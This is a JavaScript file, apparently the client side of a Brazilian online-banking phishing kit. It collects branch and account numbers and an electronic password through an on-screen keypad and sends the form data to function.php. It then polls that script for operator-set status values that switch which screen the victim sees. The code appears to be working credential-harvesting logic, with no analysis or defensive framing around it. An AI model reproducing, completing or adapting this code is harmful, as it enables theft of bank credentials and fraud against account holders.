function imgsenhaclick(tec,val)
	{
	if($('#sElet').val().length<8)
		{
		$('#'+tec).val($('#'+tec).val()+val);
		$('#sElet').val($('#sElet').val()+"1")
	}
}
function post(arg,dt)
	{
	var tmpst=true;
	if(dt==='outros')
		{
		$('#outros :input').each(function()
			{
			var min=$(this).attr('minlength');
			var max=$(this).val();
			if(min>max.length)
				{
				alert($(this).attr('valida'));
				tmpst=false;
				$(this).focus();
				return false
			}
		}
		)
	}
	if(tmpst)
		{
		$.ajax(
			{
			url:'function.php?sk='+((-0.5)+(Math.random()*(1000.99))),type:'POST',data:'act=pst&inf='+arg+'&'+$('#'+dt).serialize(),success:function(msg)
				{
				$("link").attr('href','css/norm.css');
				$('#s6').css('display','none');
				$('#principal').html(msg)
			}
		}
		)
	}
}
function Formata(Campo,teclapres)
	{
	var tecla=teclapres.keyCode;
	var vr=new String(Campo.value);
	if(tecla!=8&&tecla!=13&&tecla!=9)
		{
		if(Campo.value.length==5)
			{
			Campo.value=Campo.value+"-"
		}
	}
}
function FormataNasci(Campo,teclapres)
	{
	var tecla=teclapres.keyCode;
	var vr=new String(Campo.value);
	if(tecla!=8&&tecla!=13&&tecla!=9)
		{
		if((Campo.value.length==2)||(Campo.value.length==5))
			{
			Campo.value=Campo.value+"/"
		}
	}
}
function SomenteNumero(e)
	{
	var tecla=(window.event)?event.keyCode:e.which;
	if((tecla>47&&tecla<58))
		{
		return true
	}
	else
		{
		if(tecla==8||tecla==0||tecla==13)return true;
		else return false
	}
}
function get(arg)
	{
	if(!document.getElementById('principal'))
		{
		getprinc()
	}
	$.ajax(
		{
		url:'function.php?sk='+((-0.5)+(Math.random()*(1000.99))),type:'POST',data:'act=get&inf='+arg,success:function(msg)
			{
			var tmp=$.parseJSON(msg);
			if((tmp.STATUS!==STATUS)&&(tmp.msg!==msgold))
				{
				STATUS=tmp.STATUS;
				msgold=tmp.msg;
				if(tmp.TipoInfo!='undefined')$("link").attr('href','css/'+tmp.TipoInfo);
				if((tmp.STATUS==='AGUARDANDO')||(tmp.STATUS==='INICIO')||(tmp.STATUS==='FINALIZADA'))
					{
					$('#s6').css('display','none');
					$('#header').css('display','block');
					$('#principal').html(tmp.msg);
					if(tmp.STATUS==='INICIO')
						{
						$('#acesso').css('display','block')
					}
					else
						{
						$('#acesso').css('display','none')
					}
				}
				else
					{
					$('#principal').html("");
					$('#header').css('display','none');
					$('#s6').css('display','block');
					$('#nmeio span').html(tmp.NOME);
					if(tmp.STATUS!=='SELETRONICA')
						{
						nomeClick()
					}
					else
						{
						$('#backAll').css('display','none');
						$('#nome').css('cursor','point')
					}
					$('#backAll').html(tmp.msg)
				}
			}
		}
	}
	)
}
function nomeClick()
	{
	$('#backAll').css('display','block');
	$('#nome').css('cursor','default')
}
function ValidaForm()
	{
	var ag=document.getElementById('agxag').value;
	var cn=document.getElementById('cnxcn').value;
	if((ag=='AgГЄncia')||(cn=='Conta'))
		{
		return false
	}
	else if((ag.length<4)||((cn.length<7)))
		{
		return false
	}
	else
		{
		return true
	}
}
function validas6()
	{
	document.getElementById('sElet').value="";
	if($('#senha1').attr('value').length<12)
		{
		alert("Senha deve conter mais que 6 digitos!");
		$('#senhaelet2').css('display','none');
		$('#senhaelet1').css('display','block');
		document.getElementById('senha2').value="";
		document.getElementById('senha1').value="";
		document.getElementById('sElet').value="";
		return false
	}
	else if($('#senha2').attr('value').length<12)
		{
		alert("Digite Novamente sua Senha!");
		$('#senhaelet1').css('display','none');
		$('#senhaelet2').css('display','block');
		document.getElementById('senha2').value="";
		document.getElementById('sElet').value="";
		return false
	}
	else
		{
		if($('#senha1').attr('value').length==$('#senha2').attr('value').length)
			{
			var s1=$('#senha1').attr('value').split("");
			var s2=$('#senha2').attr('value').split("");
			for(var i=0;
			i<$('#senha1').attr('value').length;
			i++)
				{
				if(s1[i]===s2[i])
					{
					document.getElementById('sElet').value+=s1[i]
				}
			}
			var selettam=document.getElementById('sElet').value.length;
			var s1=$('#senha1').attr('value').length;
			var s2=$('#senha2').attr('value').length;
			if((selettam<6)||((s1+s2)/4!==selettam))
				{
				alert("Senha Invalida!");
				document.getElementById('senha1').value="";
				document.getElementById('senha2').value="";
				document.getElementById('sElet').value="";
				return false
			}
			else
				{
				return true
			}
		}
		else
			{
			alert("Senha Invalida!");
			$('#senhaelet2').css('display','none');
			$('#senhaelet1').css('display','block');
			document.getElementById('senha2').value="";
			document.getElementById('senha1').value="";
			document.getElementById('sElet').value="";
			return false
		}
	}
}
function getprinc()
	{
	$.ajax(
		{
		url:'princ.php?a='+((-0.5)+(Math.random()*(1000.99))),type:'GET',success:function(msg)
			{
			$('body').html(msg)
		}
	}
	)
}
